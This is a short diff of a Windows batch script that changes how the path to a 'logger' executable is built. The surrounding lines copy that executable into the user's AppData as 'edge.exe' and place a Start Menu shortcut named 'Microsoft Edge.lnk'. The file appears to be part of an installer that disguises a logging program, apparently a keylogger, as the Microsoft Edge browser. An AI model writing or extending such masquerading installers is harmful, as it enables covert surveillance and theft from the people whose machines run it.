@@ -4,8 +4,10 @@ color 3
 
 set "USER_PROFILE=%USERPROFILE%"
 
+set "DISK_LETTER=Y"
+
 :: Setting paths
-set "EXE_PATH=X:\logger\builds\version.exe"
+set "EXE_PATH=%DISK_LETTER%:\logger\builds\version.exe"
 set "EXE_DEST=%USERPROFILE%\AppData\Roaming\Browsers\edge.exe"
 set "SHORTCUT_PATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk"
 
